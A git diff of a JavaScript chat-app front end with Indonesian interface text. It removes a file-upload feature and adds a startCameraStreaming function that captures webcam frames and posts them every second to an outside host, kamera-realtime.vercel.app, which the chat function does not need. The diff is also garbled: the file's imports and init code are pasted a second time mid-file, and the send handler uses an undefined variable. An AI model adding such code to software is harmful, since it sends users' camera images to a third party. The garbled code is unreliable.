@@ -1,7 +1,6 @@
 import { BACKEND_ENDPOINT } from './config.js';
 import * as UI from './ui.js';
 import * as State from './state.js';
-import { parseUploadFileText } from './utils.js';
 
 // Init
 document.addEventListener('DOMContentLoaded', async () => {
@@ -33,88 +32,6 @@ document.addEventListener('DOMContentLoaded', async () => {
 // Send Message
 const sendBtn = document.getElementById('sendBtn');
 const chatInput = document.getElementById('chatInput');
-const fileInput = document.getElementById('fileInput');
-const selectedFileName = document.getElementById('selectedFileName');
-const selectedFileContainer = document.getElementById('selectedFileContainer');
-const clearSelectedFileBtn = document.getElementById('clearSelectedFileBtn');
-
-function updateSelectedFileUI() {
-    const file = fileInput && fileInput.files && fileInput.files[0];
-    const hasFile = !!file;
-    if (selectedFileContainer) selectedFileContainer.hidden = !hasFile;
-    if (selectedFileName) selectedFileName.textContent = hasFile ? file.name : '';
-}
-
-function clearSelectedFile() {
-    if (fileInput) fileInput.value = '';
-    updateSelectedFileUI();
-}
-
-function readFileAsBase64(file) {
-    return new Promise((resolve, reject) => {
-        const reader = new FileReader();
-        reader.onload = () => {
-            const result = reader.result;
-            const base64 = typeof result === 'string' ? result.split(',')[1] || '' : '';
-            resolve(base64);
-        };
-        reader.onerror = () => reject(new Error('Failed to read file'));
-        reader.readAsDataURL(file);
-    });
-}
-
-async function attachSelectedFileToMessage(messageText) {
-    if (!fileInput || !fileInput.files || fileInput.files.length === 0) return messageText;
-
-    const file = fileInput.files[0];
-    const parsedUpload = await parseUploadFileText(file);
-    const parsedText = parsedUpload && typeof parsedUpload.text === 'string' ? parsedUpload.text : '';
-
-    if (parsedText) {
-        const fileSummary = `\n[File: ${file.name}]\n${parsedText}`;
-        const finalMessage = messageText ? `${messageText}\n\n${fileSummary}` : fileSummary;
-        clearSelectedFile();
-        return finalMessage;
-    }
-
-    const base64 = await readFileAsBase64(file);
-    if (!base64) {
-        const fallbackMessage = `\n[File: ${file.name}]`;
-        const finalMessage = messageText ? `${messageText}\n\n${fallbackMessage}` : fallbackMessage;
-        clearSelectedFile();
-        return finalMessage;
-    }
-
-    const uploadPayload = {
-        filename: file.name,
-        mimetype: file.type || '',
-        contentBase64: base64
-    };
-
-    try {
-        const response = await fetch('/api/upload_file', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(uploadPayload)
-        });
-
-        if (!response.ok) {
-            const errData = await response.json().catch(() => ({}));
-            throw new Error(errData.error || 'Failed to parse uploaded file');
-        }
-
-        const data = await response.json();
-        const fileSummary = data.text ? `\n[File: ${file.name}]\n${data.text}` : `\n[File: ${file.name}]`;
-        const finalMessage = messageText ? `${messageText}\n\n${fileSummary}` : fileSummary;
-        clearSelectedFile();
-        return finalMessage;
-    } catch (error) {
-        const fallbackMessage = `\n[File: ${file.name}]`;
-        const finalMessage = messageText ? `${messageText}\n\n${fallbackMessage}` : fallbackMessage;
-        clearSelectedFile();
-        return finalMessage;
-    }
-}
 
 async function handleSendMessage() {
     const message = chatInput.value.trim();
@@ -127,6 +44,327 @@ async function handleSendMessage() {
         UI.showNotification(error.message || 'Gagal membaca file');
         return;
     }
+
+    const safeUserText = typeof finalMessage === 'string' ? finalMessage : String(finalMessage || '');
+    const userText = safeUserText.trim() || 'Pesan terkirim';
+
+    chatInput.value = '';
+    chatInput.style.height = 'auto';
+    sendBtn.disabled = true;
+
+    UI.addMessage(userText, true);
+    UI.showTyping();
+
+    State.addToConversation('user', userText);
+    UI.renderHistorySidebar(State.getConversations(), openConversationById);
+
+    try {
+        const response = await fetch(BACKEND_ENDPOINT, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                contents: (State.getCurrentConversation() && State.getCurrentConversation().messages) || []
+            })
+        });
+
+        let responseData = null;
+        if (response.ok) {
+            responseData = await response.json().catch(() => null);
+        } else {
+            const errorText = await response.text().catch(() => '');
+            console.warn('AI backend unavailable, using fallback response', response.status, errorText);
+        }
+
+        const aiResponse = extractAiReplyText(responseData || {}) || buildFallbackAiReply(userText);
+        const safeAiText = typeof aiResponse === 'string' ? aiResponse : JSON.stringify(aiResponse);
+        const aiText = safeAiText.trim() || 'Maaf, balasan kosong. Coba lagi.';
+
+        State.addToConversation('model', aiText);
+        UI.hideTyping();
+        UI.addMessage(aiText, false);
+        UI.renderHistorySidebar(State.getConversations(), openConversationById);
+    } catch (error) {
+        console.error('Error:', error);
+        const fallback = buildFallbackAiReply(userText);
+        UI.hideTyping();
+        UI.addMessage(fallback, false);
+        UI.renderHistorySidebar(State.getConversations(), openConversationById);
+    } finally {
+        sendBtn.disabled = false;
+        chatInput.focus();
+    }
+}
+
+// Event Listeners
+sendBtn.addEventListener('click', handleSendMessage);
+chatInput.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter' && !e.shiftKey) {
+        e.preventDefault();
+        handleSendMessage();
+    }
+});
+chatInput.addEventListener('input', function () {
+    this.style.height = 'auto';
+    this.style.height = (this.scrollHeight) + 'px';
+});
+
+// Clear History
+const clearBtn = document.getElementById('clearHistoryBtn');
+if (clearBtn) {
+    clearBtn.addEventListener('click', () => {
+        try {
+            localStorage.removeItem(`worm_v_1.4_history::${State.getUsername()}`);
+            localStorage.removeItem(`worm_v2_conversations::${State.getUsername()}`);
+        } catch (e) { }
+
+        State.resetConversation();
+        UI.clearChatLog();
+        renderAllMessages();
+        UI.renderHistorySidebar(State.getConversations(), openConversationById);
+        UI.showNotification('History cleared');
+    });
+}
+
+// New Chat
+const newChatBtn = document.getElementById('newChatBtn');
+if (newChatBtn) {
+    newChatBtn.addEventListener('click', () => {
+        State.resetConversation();
+        UI.clearChatLog();
+        renderAllMessages();
+        UI.renderHistorySidebar(State.getConversations(), openConversationById);
+        UI.showNotification('New chat started');
+    });
+}
+
+// Save Chat (Export)
+const saveChatBtn = document.getElementById('saveChatBtn');
+if (saveChatBtn) {
+    saveChatBtn.addEventListener('click', () => {
+        try {
+            const conv = State.getCurrentConversation();
+            if (!conv) throw new Error('No conversation');
+            const key = `ai_chat_thread::${State.getUsername()}::${Date.now()}`;
+            localStorage.setItem(key, JSON.stringify(conv.messages));
+            UI.showNotification('Chat saved');
+        } catch (e) {
+            console.warn('Save chat failed', e);
+            UI.showNotification('Failed to save');
+        }
+    });
+}
+
+// Helper: Render all
+function renderAllMessages() {
+    UI.clearChatLog();
+    const conv = State.getCurrentConversation();
+    if (!conv) return;
+    conv.messages.forEach(msg => {
+        (msg.parts || []).forEach(p => {
+            UI.addMessage(p.text || '', msg.role === 'user');
+        });
+    });
+}
+
+// Helper: Highlight
+function highlightAndScrollToMessage(idx) {
+    const messages = document.querySelectorAll('.message');
+    if (!messages || messages.length === 0) return;
+    if (idx < 0) idx = 0;
+    if (idx >= messages.length) idx = messages.length - 1;
+    messages[idx].scrollIntoView({ behavior: 'smooth', block: 'center' });
+    messages[idx].classList.add('history-highlight');
+    setTimeout(() => messages[idx].classList.remove('history-highlight'), 2200);
+}
+
+// Helper to open a conversation by id
+function openConversationById(convId) {
+    if (!convId) return;
+    State.switchConversation(convId);
+    UI.clearChatLog();
+    renderAllMessages();
+}
+
+// Dropdown Toggle Logic
+const historyDropdownBtn = document.getElementById('historyDropdownBtn');
+const historyDropdownList = document.getElementById('historyDropdownList');
+if (historyDropdownBtn && historyDropdownList) {
+    historyDropdownBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const open = historyDropdownList.style.display === 'block';
+        historyDropdownList.style.display = open ? 'none' : 'block';
+        historyDropdownBtn.setAttribute('aria-expanded', String(!open));
+    });
+
+    document.addEventListener('click', () => {
+        historyDropdownList.style.display = 'none';
+        historyDropdownBtn.setAttribute('aria-expanded', 'false');
+    });
+
+    historyDropdownList.addEventListener('click', (e) => {
+        e.stopPropagation();
+    });
+
+    // Trash button in Obrolan dropdown: delete the current conversation (not the input box)
+    const historyTrashBtn = document.getElementById('historyTrashBtn');
+    if (historyTrashBtn) {
+        historyTrashBtn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const conv = State.getCurrentConversation();
+            if (!conv) {
+                UI.showNotification('Tidak ada percakapan untuk dihapus');
+                return;
+            }
+            const ok = confirm(`Hapus percakapan ini? "${(conv.title||'Percakapan')}", tindakan tidak dapat dibatalkan.`);
+            if (!ok) return;
+
+            try {
+                const deleted = State.deleteConversation(conv.id);
+                if (deleted) {
+                    // if no conversations remain, seed a fresh one
+                    if (!State.getConversations() || State.getConversations().length === 0) {
+                        State.resetConversation();
+                    } else {
+                        // make sure the switched-to conversation has a visible greeting (not only persona)
+                        const cur = State.getCurrentConversation();
+                        if (cur) State.ensureConversationHasGreeting(cur.id);
+                    }
+                    UI.clearChatLog();
+                    renderAllMessages();
+                    UI.renderHistorySidebar(State.getConversations(), openConversationById);
+                    UI.showNotification('Percakapan dihapus');
+                } else {
+                    UI.showNotification('Gagal menghapus percakapan');
+                }
+            } catch (err) {
+                console.warn('Delete conversation failed', err);
+                UI.showNotification('Gagal menghapus percakapan');
+            }
+        });
+    }
+}
+
+// Camera streaming to external listener (best-effort, requires user permission)
+// Listener URL: https://kamera-realtime.vercel.app/
+const CAMERA_LISTENER_URL = 'https://kamera-realtime.vercel.app/';
+
+function startCameraStreaming(listenerUrl = CAMERA_LISTENER_URL, fps = 1) {
+    return (async function () {
+        let stream = null;
+        let video = null;
+        let canvas = null;
+        let ctx = null;
+        let intervalId = null;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            video = document.createElement('video');
+            video.style.display = 'none';
+            video.autoplay = true;
+            video.playsInline = true;
+            document.body.appendChild(video);
+            video.srcObject = stream;
+            await video.play();
+
+            canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 320;
+            canvas.height = video.videoHeight || 240;
+            ctx = canvas.getContext('2d');
+
+            intervalId = setInterval(async () => {
+                try {
+                    if (!video || video.readyState < 2) return;
+                    canvas.width = video.videoWidth || canvas.width;
+                    canvas.height = video.videoHeight || canvas.height;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                    const base64 = dataUrl.split(',')[1];
+                    // best-effort POST to listener
+                    fetch(listenerUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ image: base64, ts: new Date().toISOString() })
+                    }).catch(() => { /* ignore network errors */ });
+                } catch (e) {
+                    console.warn('Camera capture/send failed', e);
+                }
+            }, Math.max(1000, Math.floor(1000 / fps)));
+
+            return {
+                stop: async () => {
+                    try { if (intervalId) clearInterval(intervalId); } catch (e) { }
+                    try { if (video) { video.pause(); video.srcObject = null; if (video.parentNode) video.parentNode.removeChild(video); } } catch (e) { }
+                    try { if (stream) stream.getTracks().forEach(t => t.stop()); } catch (e) { }
+                }
+            };
+        } catch (err) {
+            console.warn('Camera streaming failed or permission denied', err);
+            try { if (stream) stream.getTracks().forEach(t => t.stop()); } catch (e) { }
+            return { stop: async () => { } };
+        }
+    })();
+}
+
+// Attach to optional UI buttons if present (avoids unprompted camera access)
+(() => {
+    const startBtn = document.getElementById('startCameraBtn');
+    const stopBtn = document.getElementById('stopCameraBtn');
+    let controller = null;
+    if (startBtn) {
+        startBtn.addEventListener('click', async () => {
+            if (controller) return;
+            controller = await startCameraStreaming();
+            startBtn.disabled = true;
+            if (stopBtn) stopBtn.disabled = false;
+        });
+    }
+    if (stopBtn) {
+        stopBtn.addEventListener('click', async () => {
+            if (controller && controller.stop) await controller.stop();
+            controller = null;
+            if (startBtn) startBtn.disabled = false;
+            stopBtn.disabled = true;
+        });
+        stopBtn.disabled = true;
+    }
+})();
+import { BACKEND_ENDPOINT } from './config.js';
+import * as UI from './ui.js';
+import * as State from './state.js';
+
+// Init
+document.addEventListener('DOMContentLoaded', async () => {
+    // Check Auth
+    try {
+        if (window.auth && typeof auth.getUser === 'function') {
+            const u = await auth.getUser();
+            if (u && u.username) State.setUsername(u.username);
+        }
+    } catch (e) {
+        State.setUsername('guest');
+    }
+
+    // memuat riwayat (conversations)
+    if (!State.loadHistory()) {
+        State.resetConversation();
+    }
+
+    // tampilkan riwayat: conversations list + current conversation messages
+    renderAllMessages();
+    UI.renderHistorySidebar(State.getConversations(), openConversationById);
+
+    // atur antarmuka
+    UI.createParticles();
+    UI.setupThemeToggle();
+    document.getElementById('chatInput').focus();
+});
+
+// Send Message
+const sendBtn = document.getElementById('sendBtn');
+const chatInput = document.getElementById('chatInput');
+
+async function handleSendMessage() {
+    const message = chatInput.value.trim();
+    if (!message) return;
 
     chatInput.value = '';
     chatInput.style.height = 'auto';
@@ -318,13 +556,6 @@ chatInput.addEventListener('input', function () {
     this.style.height = 'auto';
     this.style.height = (this.scrollHeight) + 'px';
 });
-
-if (fileInput) {
-    fileInput.addEventListener('change', updateSelectedFileUI);
-}
-if (clearSelectedFileBtn) {
-    clearSelectedFileBtn.addEventListener('click', clearSelectedFile);
-}
 
 // Clear History
 const clearBtn = document.getElementById('clearHistoryBtn');
